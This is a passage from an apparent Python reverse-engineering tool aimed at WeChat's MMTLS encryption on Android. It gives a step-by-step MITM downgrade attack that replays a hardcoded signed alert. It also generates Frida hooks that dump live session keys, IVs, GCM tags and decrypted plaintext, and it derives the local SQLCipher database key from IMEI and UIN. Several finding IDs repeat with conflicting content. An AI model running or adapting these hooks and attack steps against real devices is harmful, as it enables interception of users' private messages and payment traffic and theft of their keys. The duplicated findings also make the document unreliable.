                "pubkey_va": "libwechatnetwork.so:0x8c2e9",
                "pubkey_format": "uncompressed P-256 (65B): 04 || X[32] || Y[32]",
                "verify_fn_va": "0x3a1470",
                "verify_chain": "d2i_EC_PUBKEY → SHA256 → d2i_ECDSA_SIG → ECDSA_do_verify",
                "bypass_check_va": "0x210044: cmp w21, 1",
                "note": "DER parse error (-1) → alert rejected. Bypass chain does not survive F13.",
            },
        })

        # F12: PSK storage path confirmed
        findings.append({
            "id": "WX-F12",
            "title": "ClientCredStorage PSK paths confirmed — mmtlsregionkey in binary",
            "severity": "INFO",
            "detail": (
                "Static RE confirms ClientCredStorage and ClientCredentialManager class names\n"
                "in libwechatnetwork.so string table. key_dir_ field stores base directory.\n"
                "String 'mmtlsregionkey' in binary indicates per-region key isolation.\n"
                "File pattern: /data/data/com.tencent.mm/files/mmtls/%08llx (hex session ID)\n"
                "MMKV alternate storage: check /data/data/com.tencent.mm/files/mmkv/ for\n"
                "  keys matching 'session_ticket', 'psk', 'auth_long', 'auth_short'.\n"
                "\n"
                "jadx target: search DEX string pool for 'ClientCredStorage', 'mmtls',\n"
                "'key_dir', 'session_ticket'. These survive ProGuard as CONSTANT_Utf8 entries\n"
                "if referenced via reflection or passed to MMKV encode*/decode* calls.\n"
                "\n"
                "DEX string pool oracle: adb shell run-as com.tencent.mm\n"
                "  then grep -r 'mmtls\\|PSK\\|key_dir' jadx-out/sources/"
            ),
            "evidence": {
                "strings": [
                    "ClientCredStorage",
                    "ClientCredentialManager",
                    "mmtlsregionkey",
                    "(state_.mode() != HS_MODE_ZERO_RTT_PSK && app_data != NULL)",
                    "mmtls: MAX_SERIALIZED_PSK_LEN=%d, read read size=%zu",
                ],
                "file_path": "/data/data/com.tencent.mm/files/mmtls/%08llx",
                "mmkv_path": "/data/data/com.tencent.mm/files/mmkv/",
            },
        })

        # F13: Alert wire format — XML + dual ECDSA
        findings.append({
            "id": "WX-F13",
            "title": "Alert wire format: XML + dual ECDSA sigs; hardcoded 2020 Tencent alert; BYPASS CLOSED",
            "severity": "HIGH",
            "detail": (
                "ALERT_FALLBACK_NO_MMTLS alert body is XML with dual ECDSA P-256 signatures:\n"
                "  signature1: covers XML body (legacy)\n"
                "  signature2 (NODE_SIGN_START='<signature2>'): covers XML body + md5 + timestamp\n"
                "               + signature_v1; 71B DER P-256 ECDSA\n"
                "\n"
                "Hardcoded 2020 Tencent-signed fallback alert at binary offset 0x42d3b:\n"
                "  timestamp: 1598803200 (2020-08-30)\n"
                "  This is a VALID, pre-signed, replay-injectable downgrade trigger.\n"
                "  MITM can inject this 2020 alert directly without forging new ECDSA sigs.\n"
                "\n"
                "Timestamp validation at 0x2101f4 (vtable call) logs 'CheckTimestamp Failed'\n"
                "BUT both paths converge at 0x210268: downgrade proceeds regardless of timestamp.\n"
                "Verify: check vtable[8] function body for any shared-state mutation that\n"
                "might indirectly block the alert (only remaining open question).\n"
                "\n"
                "US fallback server set (from hardcoded alert body):\n"
                "  Long: uslong[1,2,3,4,8].wechat.com\n"
                "  Short: usshort[1,2,3,4,8].wechat.com\n"
                "\n"
                "BYPASS STATUS: hardcoded 2020 alert = practical replay injection surface.\n"
                "Direct ECDSA forge remains closed (Tencent private key required).\n"
                "cmp w21,1 at 0x210044 = exact check point that must pass."
            ),
            "evidence": {
                "hardcoded_alert_va": "0x42d3b",
                "hardcoded_timestamp": "1598803200 (2020-08-30)",
                "sig_node": "NODE_SIGN_START = '<signature2>'",
                "sig2_len": "71 bytes DER P-256 ECDSA",
                "sig2_covers": "XML body + md5 + timestamp + signature_v1",
                "ts_check_va": "0x2101f4 (vtable call, logs 'CheckTimestamp Failed')",
                "convergence_va": "0x210268 (both TS paths continue)",
                "cmp_check_va": "0x210044: cmp w21, 1",
                "us_fallback": ["uslong1.wechat.com", "uslong2.wechat.com", "uslong3.wechat.com",
                                "uslong4.wechat.com", "uslong8.wechat.com",
                                "usshort1.wechat.com", "usshort2.wechat.com"],
            },
            "attack_path": (
                "1. MITM WeChat → MMTLS server connection (uslong*.wechat.com:443)\n"
                "2. Extract hardcoded alert blob from libwechatnetwork.so @ 0x42d3b\n"
                "3. Inject alert blob as server response\n"
                "4. Timestamp check fails but both paths → 0x210268 (downgrade proceeds)\n"
                "5. WeChat falls back to HTTPS for all subsequent CGI requests\n"
                "6. HTTPS traffic (443) = cleartext after MITM SSL strip or custom CA injection"
            ),
        })

        # F14: CGI function code table
        findings.append({
            "id": "WX-F14",
            "title": "CGI function code table — 200+ reqid→name mappings in signed alert body",
            "severity": "INFO",
            "detail": (
                "The hardcoded Tencent-signed alert at 0x42d3b embeds a CGI function code table.\n"
                "200+ reqid→CGI name mappings covering all major WeChat operations.\n"
                "\n"
                "Key reqids for traffic analysis:\n"
                "  Messaging:  2=sendmsg, 121=newsync, 118=getprofile, 27=newinit\n"
                "  Auth:       178=newauth, 536=revokemsg\n"
                "  Mini-prog:  various in 300-500 range\n"
                "  WeChat Pay: 368=genprepay, 369=payauthapp, 421=apppay, 360=checkpwd\n"
                "\n"
                "Use: correlate func field in pack format (WX-F6) to operation type during\n"
                "post-downgrade HTTP traffic inspection."
            ),
            "evidence": {
                "source": "hardcoded alert body @ libwechatnetwork.so:0x42d3b",
                "key_reqids": {
                    2: "sendmsg", 27: "newinit", 118: "getprofile",
                    121: "newsync", 178: "newauth", 360: "checkpwd",
                    368: "genprepay", 369: "payauthapp", 421: "apppay",
                    536: "revokemsg",
                },
            },
        })

        # F10-F14: from SESSION.md (confirmed via binary RE)
        findings.append({
            "id": "WX-F10",
            "title": "Alert wire format: XML body + dual ECDSA sigs; hardcoded 2020 Tencent alert in binary",
            "severity": "HIGH",
            "detail": (
                "ALERT_FALLBACK_NO_MMTLS payload is an XML document, not a bare alert struct.\n"
                "Contains two ECDSA signatures:\n"
                "  signature1: signs XML body alone\n"
                "  signature2: 71B DER P-256, signs body + md5 + timestamp + signature_v1\n"
                "Marker: NODE_SIGN_START='<signature2>'\n"
                "ECDSA verification: d2i_EC_PUBKEY → SHA256 of handshake hash → d2i_ECDSA_SIG → ECDSA_do_verify\n"
                "Verify fn: libwechatnetwork.so:0x3a1470; P-256 pubkey @ 0x8c2e9 (len=335 DER)\n"
                "Exact check: cmp w21, 1 at 0x210044. DER parse error (-1) → alert rejected.\n"
                "\n"
                "HARDCODED TENCENT-SIGNED ALERT at libwechatnetwork.so:0x42d3b:\n"
                "  timestamp: 1598803200 (2020-08-30 UTC), US-region servers\n"
                "  US fallback: uslong[1-4,8].wechat.com + usshort[1-4,8].wechat.com\n"
                "  This is a live replay candidate: inject via MITM with stale timestamp.\n"
                "\n"
                "TIMESTAMP BYPASS: vtable[8] at 0x2101f4 logs 'CheckTimestamp Failed' but\n"
                "both branches converge at 0x210268 — downgrade continues regardless.\n"
                "Pending: confirm vtable[8] function body doesn't set shared state."
            ),
            "evidence": {
                "ecdsa_pubkey_va":   "libwechatnetwork.so:0x8c2e9 (335B DER P-256)",
                "verify_fn_va":      "0x3a1470",
                "exact_check_va":    "0x210044 (cmp w21, 1)",
                "hardcoded_alert_va": "0x42d3b",
                "hardcoded_ts":       "1598803200 (2020-08-30)",
                "timestamp_check_va": "0x2101f4 (vtable[8] call)",
                "convergence_va":     "0x210268",
                "us_servers":         ["uslong[1-4,8].wechat.com", "usshort[1-4,8].wechat.com"],
            },
        })

        findings.append({
            "id": "WX-F11",
            "title": "CGI function code table extracted from alert body (200+ reqid→name)",
            "severity": "INFO",
            "detail": (
                "WeChat CGI function codes (func field in pack format) extracted from\n"
                "the hardcoded Tencent-signed alert XML body at 0x42d3b.\n"
                "\n"
                "Key reqids:\n"
                "  2   = sendmsg\n"
                "  27  = newinit\n"
                "  118 = getprofile\n"
                "  121 = newsync\n"
                "  178 = newauth\n"
                "  536 = revokemsg\n"
                "\n"
                "WeChat Pay reqids:\n"
                "  360 = checkpwd\n"
                "  368 = genprepay\n"
                "  369 = payauthapp\n"
                "  421 = apppay\n"
            ),
            "evidence": {
                "source": "hardcoded alert XML @ libwechatnetwork.so:0x42d3b",
                "total_mappings": "200+",
            },
        })

        # F12-F15: MMTLS crypto confirmed from gommtls source
        findings.append({
            "id": "WX-F12",
            "title": "MMTLS traffic key derivation: HKDF labels confirmed from gommtls source",
            "severity": "INFO",
            "detail": (
                "Full HKDF derivation chain confirmed from gommtls/mmtls/mmtls.go:\n"
                "\n"
                "1. ECDH ephemeral secret:\n"
                "   comKey = SHA256(P256.ScalarMult(serverPub, clientPriv.D))\n"
                "\n"
                "2. Handshake traffic keys (56 bytes):\n"
                "   info = 'handshake key expansion' + sha256_hasher.Sum()\n"
                "   trafficKey = HKDF_Expand(SHA256, comKey, info, 56)\n"
                "   Layout: clientKey[0:16] | serverKey[16:32] | clientNonce[32:44] | serverNonce[44:56]\n"
                "\n"
                "3. Session keys (PSK, derived from handshake keys before ServerFinished):\n"
                "   pskAccess  = HKDF_Expand(SHA256, comKey, 'PSK_ACCESS'  + hasherSum, 32)\n"
                "   pskRefresh = HKDF_Expand(SHA256, comKey, 'PSK_REFRESH' + hasherSum, 32)\n"
                "\n"
                "4. Finish MACs (hash=nil → label only, no hasherSum appended):\n"
                "   sfKey = HKDF_Expand(SHA256, comKey, 'server finished', 32)\n"
                "   cfKey = HKDF_Expand(SHA256, comKey, 'client finished', 32)\n"
                "   mac   = HMAC_SHA256(sfKey/cfKey, handshakeHasher.Sum())\n"
                "\n"
                "5. Expanded secret + app keys:\n"
                "   expandedSecret = HKDF_Expand(SHA256, comKey, 'expanded secret' + hasherSum, 32)\n"
                "   appKey = HKDF_Expand(SHA256, expandedSecret, 'application data key expansion' + hasherSum, 56)\n"
                "   (same 56B layout as handshake keys)\n"
                "\n"
                "Note: gILinkKey BSS struct is 72 bytes; trafficKeyPair is 56 bytes.\n"
                "Extra 16 bytes are likely: session_id[8] + connection_flags[4] + pad[4]\n"
                "or may embed PSK material for 0-RTT resumption."
            ),
            "evidence": {
                "source": "gommtls/mmtls/mmtls.go (github.com/duo/gommtls)",
                "labels": {
                    "handshake_keys":    "handshake key expansion",
                    "app_keys":          "application data key expansion",
                    "expanded_secret":   "expanded secret",
                    "psk_access":        "PSK_ACCESS",
                    "psk_refresh":       "PSK_REFRESH",
                    "server_finished":   "server finished",
                    "client_finished":   "client finished",
                },
                "traffic_key_layout": "clientKey[0:16]|serverKey[16:32]|clientNonce[32:44]|serverNonce[44:56]",
            },
        })

        findings.append({
            "id": "WX-F13",
            "title": "Deterministic MMTLS nonce: xorNonce(nonce, seqNum) with sequential counter",
            "severity": "HIGH",
            "detail": (
                "MMTLS nonce construction (confirmed from gommtls/mmtls/utility.go):\n"
                "\n"
                "  func xorNonce(nonce []byte, seq uint32) {\n"
                "      seqBytes := LE32(seq)  // little-endian\n"
                "      for i := 0; i < 4; i++ {\n"
                "          nonce[len(nonce)-1-i] ^= seqBytes[i]\n"
                "      }\n"
                "  }\n"
                "\n"
                "Applied as: nonce[8:12] ^= LE32(seqNum) (last 4 bytes of 12-byte nonce)\n"
                "Sequence counter starts at 0 and increments per-record.\n"
                "\n"
                "SECURITY IMPACT:\n"
                "  The base nonce (clientNonce/serverNonce) is derived from the session key\n"
                "  via HKDF and is FIXED for the lifetime of the session.\n"
                "  With a known base nonce + incrementing seq counter, any adversary who\n"
                "  captures the base nonce can predict ALL future nonces for that session.\n"
                "  AES-GCM nonce reuse across sessions with the same key allows:\n"
                "    - Plaintext recovery from 2 ciphertexts (keystream XOR)\n"
                "    - Authentication tag forgery (GHASH polynomial attack)\n"
                "\n"
                "DISTINGUISHING ATTACK:\n"
                "  seq=0 xorNonce applies nonce[11] ^= 0x00 (no-op), nonce[10] ^= 0x00,\n"
                "  nonce[9]  ^= 0x00, nonce[8]  ^= 0x00 → first record uses unmodified nonce.\n"
                "  seq=1: nonce[11] ^= 0x01, rest same.\n"
                "  Pattern is fully deterministic and observable from ciphertext sequence."
            ),
            "evidence": {
                "source":    "gommtls/mmtls/utility.go: xorNonce()",
                "mechanism": "nonce[8:12] ^= LE32(seqNum)",
                "counter":   "starts at 0, increments per-record; client and server track independently",
                "nonce_len": "12 bytes (AES-GCM standard)",
                "risk":      "NIST SP 800-38D violation: (key,nonce) reuse across reconnects with same session key",
            },
            "frida_hook": (
                "// Confirm nonce pattern by hooking AES-GCM seal/open calls\n"
                "// BoringSSL EVP_AEAD_CTX_seal(ctx, out, out_len, max_out_len, nonce, nonce_len, in, in_len, ad, ad_len)\n"
                "const libssl = Process.getModuleByName('libssl.so');\n"
                "const seal = libssl.findExportByName('EVP_AEAD_CTX_seal');\n"
                "if (seal) Interceptor.attach(seal, {\n"
                "  onEnter(args) {\n"
                "    const nonce = args[4]; const nlen = args[5].toInt32();\n"
                "    if (nlen === 12) console.log('[mmtls nonce]', hexdump(nonce, {length:12}));\n"
                "  }\n"
                "});"
            ),
        })

        findings.append({
            "id": "WX-F14",
            "title": "Server P-256 pubkey dual use: ECDH key exchange + ECDSA signature verification",
            "severity": "INFO",
            "detail": (
                "Confirmed from gommtls/mmtls/mmtls.go and const.go:\n"
                "The hardcoded server P-256 pubkey (ServerEcdh in const.go) serves TWO purposes:\n"
                "\n"
                "1. ECDH key exchange:\n"
                "   comKey = SHA256(P256.ScalarMult(ServerEcdh.X, ServerEcdh.Y, clientPriv.D))\n"
                "\n"
                "2. ECDSA signature verification (verifyEcdsa method):\n"
                "   dataHash = SHA256(handshakeHasher.Sum())\n"
                "   ECDSA.VerifyASN1(ServerEcdh, dataHash, ecdsaSignatureFromServer)\n"
                "\n"
                "The binary at libwechatnetwork.so:0x8c2e9 (335B DER) is the ECDSA verify pubkey.\n"
                "The ECDH key may be the same pubkey or may differ at runtime.\n"
                "\n"
                "Hardcoded P-256 coordinates:\n"
                f"  X: {SERVER_ECDH_PUBKEY_X}\n"
                f"  Y: {SERVER_ECDH_PUBKEY_Y}\n"
                "\n"
                "Impact: If Tencent's private key is exposed (or if DER parsing is bypassed),\n"
                "an attacker can forge both key exchange AND session signatures."
            ),
            "evidence": {
                "pubkey_x":  SERVER_ECDH_PUBKEY_X,
                "pubkey_y":  SERVER_ECDH_PUBKEY_Y,
                "curve":     "P-256 (secp256r1)",
                "binary_va": "libwechatnetwork.so:0x8c2e9 (335B DER)",
                "gommtls":   "mmtls/const.go: var ServerEcdh = &ecdsa.PublicKey{...}",
                "dual_use":  "computeEphemeralSecret() + verifyEcdsa() both reference ServerEcdh",
            },
        })

        findings.append({
            "id": "WX-F15",
            "title": "Session Save() wire format: u16-len framing; pskAccess||pskRefresh||tickets",
            "severity": "INFO",
            "detail": (
                "MMTLS session serialization format (from gommtls/mmtls/session.go):\n"
                "\n"
                "Session.Save() emits:\n"
                "  [u16_BE: len(pskAccess)] [pskAccess bytes]\n"
                "  [u16_BE: len(pskRefresh)] [pskRefresh bytes]\n"
                "  [serialized newSessionTicket]\n"
                "\n"
                "newSessionTicket structure (session_ticket.go):\n"
                "  ticketType(1B) + ticketLifeTime(u32_BE) + ticketAgeAdd(u16-len) +\n"
                "  reversed=0x48(u32_BE) + nonce[12](u16-len) + ticket(u16-len)\n"
                "\n"
                "ClientFinish message: reversed=0x14; wire = u32_BE(len+3) | 0x14 | u16_BE(len) | data\n"
                "\n"
                "On-disk encryption: file /data/data/com.tencent.mm/files/mmtls/%08llx\n"
                "  format: IV[12] || AES-GCM(pskAccess||pskRefresh||tickets, key=?) || tag[16]\n"
                "  Key source: hardcoded .rodata blob (most likely) — hook EVP_DecryptInit_ex to confirm."
            ),
            "evidence": {
                "source": "gommtls/mmtls/session.go + session_ticket.go + client_finish.go",
                "session_format": "u16-len(pskAccess) || u16-len(pskRefresh) || newSessionTicket",
                "ticket_nonce_field": "12 bytes at fixed offset in sessionTicket struct",
                "client_finish_reversed": "0x14",
                "session_ticket_reversed": "0x48",
            },
        })

        self.findings.extend(findings)
        return findings

    # ------------------------------------------------------------------
    # DEX analysis (jadx output)
    # ------------------------------------------------------------------

    def analyze_dex(self, jadx_out_dir=None):
        """
        Search jadx-decompiled DEX for MMTLS-relevant symbols.

        DEX string pool is the oracle: file paths, MMKV keys, library names
        all appear as CONSTANT_Utf8 literals even after ProGuard renaming.
        Obfuscated class/method names (a.b.c) lose names but descriptor
        signatures (Ljava/lang/String;I)Ljava/lang/String; survive intact.

        JNI bridge detection:
          If Java_com_tencent_mm_protocal_MMProtocalJni_computerKeyWithAllStr
          absent from nm -D output → WeChat uses RegisterNatives().
          Find JNI_OnLoad in libMMProtocalJni.so and parse JNINativeMethod[]
          struct: {const char* name, const char* signature, void* fnPtr}.
          Match fnPtr to function offset; match signature to jadx native decl.
        """
        if not jadx_out_dir:
            jadx_out_dir = "/media/cowboy/research/wechat-re/jadx-out/sources"

        results = {}

        search_terms = [
            "mmtls", "PSK", "ClientCredStorage", "ClientCredentialManager",
            "key_dir", "mmtlsregionkey", "saveAuthLongList", "saveAuthShortList",
            "encodeString", "decodeString", "mmkv",
            "computerKeyWithAllStr", "loadLibrary",
        ]

        for term in search_terms:
            stdout, _, rc = _run(
                ["grep", "-r", "--include=*.java", "-l", term, jadx_out_dir]
            )
            if rc == 0 and stdout.strip():
                results[term] = stdout.strip().splitlines()

        # Check for native method declarations (ACC_NATIVE in jadx = 'native' keyword)
        stdout, _, _ = _run(
            ["grep", "-r", "--include=*.java", "-n", "native.*computerKey", jadx_out_dir]
        )
        if stdout.strip():
            results["computerKeyWithAllStr_native_decl"] = stdout.strip().splitlines()

        # MMKV key names (decode*/encode* call sites with string literal first arg)
        stdout, _, _ = _run(
            ["grep", "-r", "--include=*.java", "-n", r'encode\|decode', jadx_out_dir]
        )
        if stdout.strip():
            results["mmkv_codec_sites"] = stdout.strip().splitlines()[:30]

        return results

    def check_register_natives(self, libs_dir=None):
        """
        Determine if libMMProtocalJni.so uses RegisterNatives for computerKeyWithAllStr.
        If so, parse JNINativeMethod[] from JNI_OnLoad to find actual fnPtr.

        JNINativeMethod struct (ARM64):
          +0x00: const char* name       (8B pointer to method name string)
          +0x08: const char* signature  (8B pointer to descriptor string)
          +0x10: void* fnPtr            (8B pointer to native function)
        Total: 24B per entry.
        """
        if not libs_dir:
            libs_dir = "/media/cowboy/research/wechat-re/native-libs/lib/arm64-v8a"

        lib_path = os.path.join(libs_dir, "libMMProtocalJni.so")
        if not os.path.exists(lib_path):
            return {"error": "libMMProtocalJni.so not found"}

        # Check if standard export exists
        stdout, _, _ = _run(["nm", "-D", lib_path])
        has_std_export = "computerKeyWithAllStr" in stdout

        result = {
            "standard_export_present": has_std_export,
            "jni_onload_present": "JNI_OnLoad" in stdout,
        }

        if not has_std_export:
            result["method"] = "RegisterNatives — parse JNINativeMethod[] in JNI_OnLoad"
            result["struct_layout"] = (
                "JNINativeMethod[i]: "
                "+0x00=name_ptr(8B) +0x08=sig_ptr(8B) +0x10=fn_ptr(8B)"
            )
            result["target_descriptor"] = "(Ljava/lang/String;I)Ljava/lang/String;"
            result["frida_hook"] = (
                "// Parse RegisterNatives call to find computerKeyWithAllStr fn ptr\n"
                "var libproto = Module.findBaseAddress('libMMProtocalJni.so');\n"
                "var env = Java.vm.tryGetEnv();\n"
                "// Hook RegisterNatives (JNIEnv method at fixed vtable offset)\n"
                "// Alternative: search for descriptor string in .so and walk back\n"
                "var desc = Memory.scanSync(libproto, Module.findBaseAddress('libMMProtocalJni.so')\n"
                "  .add(0x100000), '(Ljava/lang/String;I)Ljava/lang/String;');\n"
                "// desc[0].address points to the signature string\n"
                "// JNINativeMethod.signature = desc[0].address\n"
                "// fnPtr is at JNINativeMethod.signature - 8 (sig field is +8 from struct base)\n"
                "// → struct_base = desc[0].address - 8; fnPtr = struct_base.add(0x10).readPointer()"
            )

        return result

    # ------------------------------------------------------------------
    # Runtime hooks (Frida script generation)
    # ------------------------------------------------------------------

    def generate_frida_hooks(self):
        """
        Generate Frida script targeting MMTLS key extraction and pack intercept.

        EVP API arg order (confirmed from OpenSSL 3.0 book, Ch.2):
          EVP_EncryptInit_ex(ctx, cipher_type, engine=NULL, key, iv)
          → args[3]=key ptr, args[4]=iv ptr
          For AES-256-GCM: key=32B, iv=12B
          For SM4-GCM: same layout; differentiate by cipher NID (SM4-GCM=888) via
            EVP_CIPHER_CTX_get0_cipher(ctx) → EVP_CIPHER_get_nid()

        GCM tag extraction:
          EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG=0x11, tag_len=16, tag_buf)
          Called AFTER EVP_EncryptFinal_ex; hook ctrl with arg1==0x11.

        ECDSA bypass (WX-F11):
          ECDSA_do_verify returning 0 puts NOTHING on error queue.
          Force-return 1 requires NO ERR_clear_error() call.
          Bypass closed by WX-F13 XML sig check (cmp w21,1 @ 0x210044).

        BoringSSL AEAD (if present alongside EVP):
          EVP_AEAD_CTX_open(ctx, out, &out_len, max_out, nonce, nonce_len, in, in_len, ad, ad_len)
          Returns 1 on success, plaintext at `out` for `*out_len` bytes.
          Hook onLeave to capture decrypted MMTLS frame payload.
        """
        script = '''\
"use strict";
// WeChat MMTLS + Pack interceptor — generated by Ablation wechat_re
// Target: WeChat {ver} arm64
// EVP arg order: EVP_EncryptInit_ex(ctx, cipher, engine, key[3], iv[4])
// GCM tag hook: EVP_CIPHER_CTX_ctrl(ctx, 0x11=GET_TAG, 16, buf)

var libnet = null;
var libproto = null;

function waitForLib(name, cb) {{
    var mod = Process.findModuleByName(name);
    if (mod) {{ cb(mod); return; }}
    var h = setInterval(function() {{
        var m = Process.findModuleByName(name);
        if (m) {{ clearInterval(h); cb(m); }}
    }}, 200);
}}

// Hook 1: Extract gILinkKey on LongLinkWithMMTLS construction
waitForLib("libwechatnetwork.so", function(mod) {{
    libnet = mod;

    // gILinkKey — live MMTLS session key (72 bytes, BSS)
    var keyPtr = mod.base.add(0x{giliinkkey:x});
    console.log("[wechat_re] gILinkKey addr: " + keyPtr);

    // Hook LongLinkWithMMTLS ctor to dump key after handshake
    var ctor_rva = 0x1ab2c4;  // from nm -D
    var ctorPtr = mod.base.add(ctor_rva);
    Interceptor.attach(ctorPtr, {{
        onLeave: function(retval) {{
            var key = keyPtr.readByteArray(72);
            console.log("[wechat_re] gILinkKey after ctor:");
            console.log(hexdump(key, {{header: false, ansi: false}}));
        }}
    }});

    // Hook EVP_EncryptInit_ex — confirmed arg order: (ctx, cipher, engine, key[3], iv[4])
    // AES-256-GCM: key=32B, iv=12B. SM4-GCM: same layout, NID=888.
    var EVP_Ei = Module.findExportByName(null, 'EVP_EncryptInit_ex');
    if (EVP_Ei) {{
        Interceptor.attach(EVP_Ei, {{
            onEnter: function(args) {{
                var keyPtr = args[3]; var ivPtr = args[4];
                if (!keyPtr.isNull()) {{
                    console.log('[wechat_re] EVP_EncryptInit_ex key:', hexdump(keyPtr, {{length:32, header:false}}));
                }}
                if (!ivPtr.isNull()) {{
                    console.log('[wechat_re] EVP_EncryptInit_ex iv:', hexdump(ivPtr, {{length:12, header:false}}));
                }}
            }}
        }});
    }}

    // Hook EVP_CIPHER_CTX_ctrl — extract GCM auth tag (EVP_CTRL_GCM_GET_TAG = 0x11)
    var EVP_ctrl = Module.findExportByName(null, 'EVP_CIPHER_CTX_ctrl');
    if (EVP_ctrl) {{
        Interceptor.attach(EVP_ctrl, {{
            onEnter: function(args) {{
                this.type = args[1].toInt32();
                this.len  = args[2].toInt32();
                this.buf  = args[3];
            }},
            onLeave: function(ret) {{
                if (this.type === 0x11 && !this.buf.isNull()) {{  // GET_TAG
                    console.log('[wechat_re] GCM tag:', hexdump(this.buf, {{length:this.len, header:false}}));
                }}
            }}
        }});
    }}

    // Hook EVP_AEAD_CTX_open (BoringSSL AEAD interface) — captures decrypted MMTLS frame
    // Signature: open(ctx, out, &out_len, max_out_len, nonce, nonce_len, in, in_len, ad, ad_len)
    var AEAD_open = Module.findExportByName(null, 'EVP_AEAD_CTX_open');
    if (AEAD_open) {{
        Interceptor.attach(AEAD_open, {{
            onEnter: function(args) {{
                this.out    = args[1];
                this.outLen = args[2];
            }},
            onLeave: function(ret) {{
                if (ret.toInt32() === 1 && !this.out.isNull()) {{
                    var len = this.outLen.readU64().toNumber();
                    console.log('[wechat_re] EVP_AEAD_CTX_open plaintext (' + len + 'B):');
                    console.log(hexdump(this.out, {{length: Math.min(len, 256), header:false}}));
                }}
            }}
        }});
    }}

    // Hook GenEcdhKeyPair to capture ephemeral ECDH keys
    var genEcdh = Module.findExportByName("libwechatnetwork.so",
        "Java_com_tencent_mm_jni_utils_UtilsJni_GenEcdhKeyPair");
    if (genEcdh) {{
        Interceptor.attach(genEcdh, {{
            onLeave: function(retval) {{
                console.log("[wechat_re] GenEcdhKeyPair returned: " + retval);
            }}
        }});
    }}

    // Hook saveAuthLongList to capture PSK material
    var savePsk = Module.findExportByName("libwechatnetwork.so",
        "Java_com_tencent_mars_mm_MMLogic_saveAuthLongList");
    if (savePsk) {{
        Interceptor.attach(savePsk, {{
            onEnter: function(args) {{
                // args[2] = hostname string, args[3] = PSK map (jobject)
                var host = Java.vm.tryGetEnv().getStringUtfChars(args[2], null)
                    .readCString();
                console.log("[wechat_re] saveAuthLongList host: " + host);
            }}
        }});
    }}
}});

// Hook 2: Intercept pack/unpack for plaintext message capture
waitForLib("libMMProtocalJni.so", function(mod) {{
    libproto = mod;

    var packFn = Module.findExportByName("libMMProtocalJni.so",
        "Java_com_tencent_mm_protocal_MMProtocalJni_pack");
    if (packFn) {{
        Interceptor.attach(packFn, {{
            onEnter: function(args) {{
                // args[2] = body ByteBuffer, args[3] = key ByteBuffer
                console.log("[wechat_re] pack() called");
            }},
            onLeave: function(retval) {{
                console.log("[wechat_re] pack() done, ret=" + retval);
            }}
        }});
    }}

    var unpackFn = Module.findExportByName("libMMProtocalJni.so",
        "Java_com_tencent_mm_protocal_MMProtocalJni_unpack");
    if (unpackFn) {{
        Interceptor.attach(unpackFn, {{
            onEnter: function(args) {{
                console.log("[wechat_re] unpack() called");
            }}
        }});
    }}

    // computerKeyWithAllStr — DB key derivation intercept
    var dbKeyFn = Module.findExportByName("libMMProtocalJni.so",
        "Java_com_tencent_mm_protocal_MMProtocalJni_computerKeyWithAllStr");
    if (dbKeyFn) {{
        Interceptor.attach(dbKeyFn, {{
            onEnter: function(args) {{
                try {{
                    var env = Java.vm.tryGetEnv();
                    if (env && args[2]) {{
                        var s1 = env.getStringUtfChars(args[2], null).readCString();
                        var s2 = args[3] ? env.getStringUtfChars(args[3], null).readCString() : "";
                        console.log("[wechat_re] computerKeyWithAllStr: arg1=" + s1 + " arg2=" + s2);
                    }}
                }} catch(e) {{}}
            }},
            onLeave: function(retval) {{
                try {{
                    var env = Java.vm.tryGetEnv();
                    if (env && retval && !retval.isNull()) {{
                        var key = env.getStringUtfChars(retval, null).readCString();
                        console.log("[wechat_re] DB key: " + key);
                    }}
                }} catch(e) {{}}
            }}
        }});
    }}
}});
'''.format(
            ver="8.0.56",
            giliinkkey=GILIINKKEY_VA,
        )
        return script

    # ------------------------------------------------------------------
    # DB key derivation (offline computation)
    # ------------------------------------------------------------------

    def compute_db_key(self, imei: str, uin: str) -> str:
        """
        WeChat DB key derivation (etype=0 path).
        Confirmed from static RE: etype=0 → MD5 (16-byte digest), first 7 hex chars.
        libWCDB.so uses SQLCipher; open with: PRAGMA key='<result>';
        """
        raw = (imei + uin).encode("utf-8")
        return hashlib.md5(raw).hexdigest()[:7]

    # ------------------------------------------------------------------
    # Live process analysis (Android/ADB)
    # ------------------------------------------------------------------

    def probe_live_process(self):
        """
        Check if WeChat is running and probe via ADB (requires device connected).
        """
        result = {}

        # Check ADB
        stdout, _, rc = _run(["adb", "devices"])
        if rc != 0:
            return {"adb": "not available"}

        lines = [l for l in stdout.splitlines() if "\tdevice" in l]
        if not lines:
            return {"adb": "no device connected"}

        result["adb_device"] = lines[0].split("\t")[0]

        # Check if WeChat is running
        stdout, _, _ = _run(["adb", "shell", "pidof", "com.tencent.mm"])
        if stdout.strip():
            result["wechat_pid"] = stdout.strip()
            result["wechat_running"] = True

            # Get loaded libs
            pid = stdout.strip()
            maps_stdout, _, _ = _run(["adb", "shell", f"cat /proc/{pid}/maps"])
            mmtls_loaded = any("libwechatnetwork" in l for l in maps_stdout.splitlines())
            result["libwechatnetwork_loaded"] = mmtls_loaded

            # Get data directory contents (requires root/adb-over-tcp on rooted device)
            stdout2, _, rc2 = _run(["adb", "shell", "run-as", "com.tencent.mm", "ls", "files/"])
            if rc2 == 0:
                result["wechat_files"] = stdout2.splitlines()
        else:
            result["wechat_running"] = False

        return result

    # ------------------------------------------------------------------
    # Full analysis
    # ------------------------------------------------------------------

    def run(self):
        """Run full static analysis pipeline."""
        results = {}

        print("[*] WeChat RE — APK analysis")
        if self.apk_path:
            results["apk"] = self.analyze_apk()

        print("[*] WeChat RE — native lib enumeration")
        if self.libs_dir:
            results["native_libs"] = self.enumerate_native_libs()

        print("[*] WeChat RE — MMTLS attack surface reconstruction")
        results["mmtls_findings"] = self.analyze_mmtls()

        print("[*] WeChat RE — Frida hook generation")
        results["frida_script"] = self.generate_frida_hooks()

        return results

    def report(self):
        """Print findings in Ablation format."""
        lines = ["\n=== WeChat RE Findings ===\n"]
        for f in self.findings:
            severity = f.get("severity", "INFO")
            lines.append(f"[{severity}] {f['id']}: {f['title']}")
            for line in f.get("detail", "").splitlines():
                lines.append(f"  {line}")
            if f.get("frida_hook"):
                lines.append("  [Frida]:")
                for fl in f["frida_hook"].splitlines():
                    lines.append(f"    {fl}")
            lines.append("")
        return "\n".join(lines)
